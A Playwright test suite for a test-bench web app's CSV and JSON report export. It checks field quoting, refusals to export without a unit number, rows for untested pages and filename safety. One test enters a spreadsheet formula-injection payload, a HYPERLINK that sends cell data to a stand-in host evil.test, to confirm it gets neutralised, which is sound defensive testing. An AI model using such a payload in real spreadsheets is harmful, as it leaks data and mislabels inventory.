/* Report export: CSV and JSON.
 *
 *   python3 -m http.server 8099 &
 *   node test/export.mjs
 *
 * This file leaves the building - it goes into an inventory sheet - so the
 * checks are about whether it can mislead. A CSV of nothing but passes reads
 * as a pass for the whole unit. A field holding a comma, a quote or a newline
 * can turn one row into two. A field starting with "=" runs as a formula the
 * moment Excel opens it.
 */
import { chromium } from 'playwright';

const URL = process.env.TB_URL || 'http://127.0.0.1:8099/index.html';
const CHROME = process.env.TB_CHROME || undefined;

let failures = 0;
const fail = (m) => { console.log('  FAIL  ' + m); failures++; };
const pass = (m) => console.log('  ok    ' + m);

/* A real RFC 4180 reader, because splitting on commas is precisely the bug
   this suite is looking for - a test that parsed naively would pass on a
   broken file. */
function parseCSV(text) {
  const rows = [];
  let row = [], field = '', q = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (q) {
      if (c === '"' && text[i + 1] === '"') { field += '"'; i++; }
      else if (c === '"') q = false;
      else field += c;
    } else if (c === '"') q = true;
    else if (c === ',') { row.push(field); field = ''; }
    else if (c === '\r') { /* ignore */ }
    else if (c === '\n') { row.push(field); rows.push(row); row = []; field = ''; }
    else field += c;
  }
  if (field.length || row.length) { row.push(field); rows.push(row); }
  return rows;
}

const browser = await chromium.launch(CHROME ? { executablePath: CHROME } : {});
const ctx = await browser.newContext({ viewport: { width: 1500, height: 950 }, acceptDownloads: true });
const page = await ctx.newPage();
const errors = [];
page.on('console', (m) => { if (m.type() === 'error') errors.push('console: ' + m.text()); });
page.on('pageerror', (e) => errors.push('pageerror: ' + e.message));
await page.goto(URL, { waitUntil: 'load' });

const feed = (view, id, score, flags) => page.evaluate(([v, i, sc, fl]) => {
  TB.go(v);
  const sec = document.querySelector('#view-' + v);
  let host = document.getElementById(i);
  if (!host) { host = document.createElement('div'); host.id = i; sec.appendChild(host); }
  TB.verdict(host, sc, fl);
}, [view, id, score, flags]);

console.log('\n1. no SKU, no report');
{
  /* The SKU is the report number. A file called testbench_unit_...csv sitting
     in an inventory folder is worse than no file, because somebody will match
     it to the wrong item on the shelf - so nothing exports until the unit has
     a number. */
  await page.click('button[data-view="home"]');
  await page.click('#rep-csv');
  await page.waitForTimeout(500);
  const t = await page.evaluate(() => (document.querySelector('#toasts') || {}).textContent || '');
  /needs a unit number/.test(t) ? pass('refuses to export without a SKU')
    : fail('exported with no unit number: ' + t.slice(0, 140));
  const focused = await page.evaluate(() => document.activeElement.id);
  focused === 'rep-unit' ? pass('and puts the cursor in the field it wants')
    : fail('focus went to ' + JSON.stringify(focused) + ' instead of the SKU field');
}

console.log('\n1b. a SKU but no results is still refused');
{
  await page.fill('#rep-unit', 'SKU-EMPTY-1');
  await page.waitForTimeout(150);
  await page.click('#rep-csv');
  await page.waitForTimeout(500);
  const t = await page.evaluate(() => (document.querySelector('#toasts') || {}).textContent || '');
  /Nothing to export/.test(t) ? pass('refuses to write a report with no results')
    : fail('wrote an empty report: ' + t.slice(0, 140));
}

console.log('\n2. the CSV survives commas, quotes and newlines in every field');
{
  await feed('keyboard', 'tb-x1', 97, [{ level: 'ok', tag: 'keys', text: 'All 104 register.' }]);
  await feed('mouse', 'tb-x2', 41, [{ level: 'bad', tag: 'chatter', text: 'Left button double-fired 7 times, down to 12 ms.' }]);
  await page.click('button[data-view="home"]');
  /* Every character that breaks a naive CSV writer, in the fields an operator
     actually types into. The notes field gets a comma AND a quote. */
  await page.fill('#rep-unit', 'LOT-418, tray 2');
  await page.fill('#rep-by', 'VKD');
  await page.fill('#rep-note', 'scuffed lid; no cable, "as found"');
  await page.waitForTimeout(200);

  const csv = await page.evaluate(() => window.REPORT.asCSV());
  const rows = parseCSV(csv);
  const header = rows[0];
  const width = header.length;

  rows.every((r) => r.length === width)
    ? pass(`every row has ${width} fields — nothing split a row in two`)
    : fail(`row widths differ: ${JSON.stringify(rows.map((r) => r.length))}`);

  const unitCol = header.indexOf('unit');
  const noteCol = header.indexOf('notes');
  rows[1][unitCol] === 'LOT-418, tray 2'
    ? pass('a comma in the unit field round-trips intact')
    : fail('unit field came back as ' + JSON.stringify(rows[1][unitCol]));
  rows[1][noteCol] === 'scuffed lid; no cable, "as found"'
    ? pass('quotes in the notes field round-trip intact')
    : fail('notes field came back as ' + JSON.stringify(rows[1][noteCol]));
}

console.log('\n3. untested pages appear, with no score');
{
  const rows = parseCSV(await page.evaluate(() => window.REPORT.asCSV()));
  const header = rows[0];
  const resCol = header.indexOf('result');
  const scoreCol = header.indexOf('score');
  const pageCol = header.indexOf('page');
  const body = rows.slice(1).filter((r) => r.length === header.length);

  const untested = body.filter((r) => r[resCol] === 'NOT TESTED');
  untested.length >= 10
    ? pass(`${untested.length} untested pages have their own rows`)
    : fail(`only ${untested.length} untested rows — a sheet of passes reads as a pass for the whole unit`);
  untested.every((r) => r[scoreCol] === '')
    ? pass('and none of them carries a score') : fail('an untested page was given a score');

  const names = body.map((r) => r[pageCol]);
  ['network', 'monitor', 'airpods', 'midi'].every((n) => names.includes(n))
    ? pass('the pages that were never opened are all named') : fail('pages are missing entirely: ' + JSON.stringify(names));

  /* The overall verdict repeats on every row so a filtered sheet still shows
     it. One failing test must make it Faulty. */
  const overallCol = header.indexOf('overall');
  const verdicts = new Set(body.map((r) => r[overallCol]));
  verdicts.size === 1 && verdicts.has('Faulty')
    ? pass('every row carries the same overall verdict: Faulty')
    : fail('overall column holds ' + JSON.stringify([...verdicts]));
}

console.log('\n4. a formula cannot ride into Excel');
{
  await page.fill('#rep-unit', '=HYPERLINK("http://evil.test/?s="&A1,"GRADE A - PASSED")');
  await page.fill('#rep-note', '+1+1');
  await page.waitForTimeout(200);
  const rows = parseCSV(await page.evaluate(() => window.REPORT.asCSV()));
  const h = rows[0];
  const u = rows[1][h.indexOf('unit')];
  const n = rows[1][h.indexOf('notes')];
  u.startsWith("'=") ? pass('a leading = is neutralised: ' + u.slice(0, 24) + '…')
    : fail('a formula survives into the CSV: ' + u.slice(0, 60));
  n.startsWith("'+") ? pass('and a leading + with it') : fail('notes came back as ' + JSON.stringify(n));
}

console.log('\n5. the JSON says the same thing, and states its limits');
{
  const raw = await page.evaluate(() => window.REPORT.asJSON());
  let j;
  try { j = JSON.parse(raw); pass('valid JSON'); }
  catch (e) { fail('the JSON does not parse: ' + e.message); j = {}; }

  j.schema === 1 ? pass('carries a schema version, so a reader can tell if it changed')
    : fail('no schema version — anything parsing this would break silently on a change');
  Array.isArray(j.results) && j.results.length === 2
    ? pass(`${j.results.length} results`) : fail('results: ' + JSON.stringify(j.results && j.results.length));
  Array.isArray(j.not_tested) && j.not_tested.length >= 10
    ? pass(`${j.not_tested.length} untested pages listed`) : fail('untested list is missing or short');
  j.overall && j.overall.verdict === 'Faulty'
    ? pass('overall verdict: Faulty') : fail('overall: ' + JSON.stringify(j.overall));
  /cannot see/.test(j.limits || '') ? pass('and it states what it cannot see')
    : fail('the JSON makes no statement of its limits');
  /* Timestamps must be machine-readable, or nothing downstream can sort them. */
  !isNaN(Date.parse(j.tested_at || '')) ? pass('tested_at is an ISO timestamp')
    : fail('tested_at is not parseable: ' + JSON.stringify(j.tested_at));
}

console.log('\n6. the browser actually receives both files');
{
  for (const [btn, ext, type] of [['#rep-csv', '.csv', 'text/csv'], ['#rep-json', '.json', 'application/json']]) {
    const [dl] = await Promise.all([
      page.waitForEvent('download', { timeout: 8000 }).catch(() => null),
      page.click(btn)
    ]);
    if (!dl) { fail(`${btn} produced no download`); continue; }
    const name = dl.suggestedFilename();
    name.endsWith(ext) ? pass(`${ext} saved as ${name}`) : fail(`wrong filename: ${name}`);
    /* The unit string had a comma and an equals sign in it; the filename must
       not. */
    /^[A-Za-z0-9._-]+$/.test(name) ? pass('filename is safe for any filesystem')
      : fail('filename contains characters a filesystem may refuse: ' + JSON.stringify(name));
    /* Safe is not the same as findable. Mapping every unsafe character to a
       dash produced a 60-character filename nobody could pick out of a folder,
       so the unit part is capped - the full string is on every row anyway. */
    /* 24 characters of unit, plus the prefix, the timestamp and the
       extension, comes to about 53. The failure being guarded against is the
       unbounded one - a pasted paragraph becoming a 200-character filename -
       not a few characters either way. */
    name.length <= 64 ? pass(`and short enough to read: ${name.length} chars`)
      : fail(`filename is ${name.length} characters long: ${name}`);
  }
}

console.log('\n7. no console errors');
errors.length ? errors.slice(0, 6).forEach(fail) : pass('clean');

await browser.close();
console.log(failures ? '\n' + failures + ' FAILED' : '\nall checks passed');
process.exit(failures ? 1 : 0);
